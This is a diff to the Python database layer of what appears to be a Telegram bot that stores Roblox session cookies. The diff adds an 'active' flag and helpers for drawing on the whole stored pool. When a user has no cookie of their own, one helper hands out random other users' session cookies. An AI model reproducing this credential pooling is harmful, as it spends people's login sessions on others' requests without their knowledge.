@@ -1,5 +1,6 @@
 import aiosqlite
 import json
+import logging
 from pathlib import Path
 from typing import Optional, Dict, List, Tuple, Any
 from datetime import datetime, timedelta
@@ -45,6 +46,7 @@ CREATE TABLE IF NOT EXISTS user_cookies (
   roblox_id         INTEGER NOT NULL,
   enc_roblosecurity TEXT NOT NULL,
   saved_at          TEXT DEFAULT CURRENT_TIMESTAMP,
+  is_active         BOOLEAN DEFAULT TRUE,
   PRIMARY KEY (telegram_id, roblox_id)
 );
 '''
@@ -74,6 +76,23 @@ CREATE TABLE IF NOT EXISTS bot_users (
 '''
 
 
+async def migrate_add_is_active_column():
+    """Добавляет колонку is_active если её нет"""
+    try:
+        async with aiosqlite.connect(DB_STR) as db:
+            # Проверяем существует ли колонка
+            cur = await db.execute("PRAGMA table_info(user_cookies)")
+            columns = await cur.fetchall()
+            column_names = [col[1] for col in columns]
+
+            if 'is_active' not in column_names:
+                await db.execute('ALTER TABLE user_cookies ADD COLUMN is_active BOOLEAN DEFAULT TRUE')
+                await db.commit()
+                logging.info("Added is_active column to user_cookies")
+    except Exception as e:
+        logging.error(f"Migration failed: {e}")
+
+
 async def init_db():
     async with aiosqlite.connect(DB_STR) as db:
         await db.execute(CREATE_USERS_SQL)
@@ -81,8 +100,11 @@ async def init_db():
         await db.execute(CREATE_SNAPSHOTS_SQL)
         await db.execute(CREATE_COOKIES_SQL)
         await db.execute(CREATE_CACHE_SQL)
-        await db.execute(CREATE_BOT_USERS_SQL)  # Добавляем новую таблицу
+        await db.execute(CREATE_BOT_USERS_SQL)
         await db.commit()
+
+    # Запускаем миграцию
+    await migrate_add_is_active_column()
 
 
 async def track_bot_user(telegram_id: int, username: str = None, first_name: str = None, last_name: str = None,
@@ -153,7 +175,7 @@ async def list_users(telegram_id: int) -> List[Tuple[int, str]]:
             result = [(int(r[0]), r[1]) for r in rows]
             return result
     except Exception as e:
-        print(f'❌ Ошибка в list_users: {e}')
+        logging.error(f'❌ Ошибка в list_users: {e}')
         return []
 
 
@@ -161,8 +183,8 @@ async def save_encrypted_cookie(telegram_id: int, roblox_id: int, enc_cookie: st
     async with aiosqlite.connect(DB_STR) as db:
         await db.execute(
             '''
-            INSERT OR REPLACE INTO user_cookies (telegram_id, roblox_id, enc_roblosecurity)
-            VALUES (?, ?, ?)
+            INSERT OR REPLACE INTO user_cookies (telegram_id, roblox_id, enc_roblosecurity, is_active)
+            VALUES (?, ?, ?, TRUE)
             ''',
             (telegram_id, roblox_id, enc_cookie)
         )
@@ -172,7 +194,7 @@ async def save_encrypted_cookie(telegram_id: int, roblox_id: int, enc_cookie: st
 async def get_encrypted_cookie(telegram_id: int, roblox_id: int) -> Optional[str]:
     async with aiosqlite.connect(DB_STR) as db:
         cur = await db.execute(
-            'SELECT enc_roblosecurity FROM user_cookies WHERE telegram_id=? AND roblox_id=?',
+            'SELECT enc_roblosecurity FROM user_cookies WHERE telegram_id=? AND roblox_id=? AND is_active = TRUE',
             (telegram_id, roblox_id)
         )
         row = await cur.fetchone()
@@ -184,6 +206,16 @@ async def delete_cookie(telegram_id: int, roblox_id: int) -> None:
     async with aiosqlite.connect(DB_STR) as db:
         await db.execute('DELETE FROM user_cookies WHERE telegram_id=? AND roblox_id=?', (telegram_id, roblox_id))
         await db.execute('DELETE FROM authorized_users WHERE telegram_id=? AND roblox_id=?', (telegram_id, roblox_id))
+        await db.commit()
+
+
+async def deactivate_cookie(telegram_id: int, roblox_id: int) -> None:
+    """Деактивирует куки (помечает как неактивную)"""
+    async with aiosqlite.connect(DB_STR) as db:
+        await db.execute(
+            'UPDATE user_cookies SET is_active = FALSE WHERE telegram_id=? AND roblox_id=?',
+            (telegram_id, roblox_id)
+        )
         await db.commit()
 
 
@@ -265,17 +297,6 @@ async def admin_stats() -> dict:
     }
 
 
-async def get_any_encrypted_cookie_by_roblox_id(roblox_id: int) -> Optional[str]:
-    """Вернёт любую (первую попавшуюся) зашифрованную куку для данного roblox_id, если есть."""
-    async with aiosqlite.connect(DB_STR) as db:
-        cur = await db.execute(
-            'SELECT enc_roblosecurity FROM user_cookies WHERE roblox_id=? LIMIT 1',
-            (roblox_id,)
-        )
-        row = await cur.fetchone()
-        return row[0] if row else None
-
-
 async def upsert_account_snapshot(roblox_id: int, inventory_val: int, total_spent: int) -> None:
     async with aiosqlite.connect(DB_STR) as db:
         await db.execute(
@@ -305,17 +326,54 @@ async def get_account_snapshot(roblox_id: int) -> Optional[dict]:
 
 
 # =========================
-# NEW: глобальные хелперы для перебора кук
+# Глобальные хелперы для перебора кук (ИСПРАВЛЕННЫЕ)
 # =========================
+
+async def get_multiple_cookies_quick(limit: int = 3) -> List[str]:
+    """Быстро получает несколько случайных куки из БД"""
+    try:
+        async with aiosqlite.connect(DB_STR) as db:
+            # Для SQLite используем RANDOM()
+            query = """
+            SELECT enc_roblosecurity FROM user_cookies 
+            WHERE is_active = TRUE
+            ORDER BY RANDOM() 
+            LIMIT ?
+            """
+            cur = await db.execute(query, (limit,))
+            rows = await cur.fetchall()
+            return [row[0] for row in rows] if rows else []
+    except Exception as e:
+        logging.error(f"Failed to get multiple cookies: {e}")
+        return []
+
+
+async def get_any_encrypted_cookie_by_roblox_id(roblox_id: int) -> Optional[str]:
+    """Быстро получает любую куки для указанного roblox_id"""
+    try:
+        async with aiosqlite.connect(DB_STR) as db:
+            query = """
+            SELECT enc_roblosecurity FROM user_cookies 
+            WHERE roblox_id = ? AND is_active = TRUE
+            LIMIT 1
+            """
+            cur = await db.execute(query, (roblox_id,))
+            row = await cur.fetchone()
+            return row[0] if row else None
+    except Exception as e:
+        logging.error(f"Failed to get cookie for {roblox_id}: {e}")
+        return None
+
 
 async def list_all_owners() -> List[int]:
     """Все telegram_id, у которых сохранена хотя бы одна кука."""
     try:
         async with aiosqlite.connect(DB_STR) as db:
-            cur = await db.execute('SELECT DISTINCT telegram_id FROM user_cookies')
+            cur = await db.execute('SELECT DISTINCT telegram_id FROM user_cookies WHERE is_active = TRUE')
             rows = await cur.fetchall()
             return [int(r[0]) for r in rows]
-    except Exception:
+    except Exception as e:
+        logging.error(f"Failed to list owners: {e}")
         return []
 
 
@@ -326,8 +384,33 @@ async def list_all_cookies() -> List[Tuple[int, int, str]]:
     """
     try:
         async with aiosqlite.connect(DB_STR) as db:
-            cur = await db.execute('SELECT telegram_id, roblox_id, enc_roblosecurity FROM user_cookies')
+            cur = await db.execute(
+                'SELECT telegram_id, roblox_id, enc_roblosecurity FROM user_cookies WHERE is_active = TRUE')
             rows = await cur.fetchall()
             return [(int(r[0]), int(r[1]), r[2]) for r in rows]
-    except Exception:
+    except Exception as e:
+        logging.error(f"Failed to list all cookies: {e}")
         return []
+
+
+async def get_active_cookies_count() -> int:
+    """Возвращает количество активных куки в БД"""
+    try:
+        async with aiosqlite.connect(DB_STR) as db:
+            cur = await db.execute('SELECT COUNT(*) FROM user_cookies WHERE is_active = TRUE')
+            return (await cur.fetchone())[0]
+    except Exception as e:
+        logging.error(f"Failed to count active cookies: {e}")
+        return 0
+
+
+async def find_working_cookie_for_user(roblox_id: int, max_attempts: int = 3) -> Optional[str]:
+    """Находит рабочую куки для пользователя (для ultra-fast режима)"""
+    # Сначала пробуем куки именно для этого пользователя
+    user_cookie = await get_any_encrypted_cookie_by_roblox_id(roblox_id)
+    if user_cookie:
+        return user_cookie
+
+    # Если нет, берем случайные куки из БД
+    random_cookies = await get_multiple_cookies_quick(limit=max_attempts)
+    return random_cookies[0] if random_cookies else None
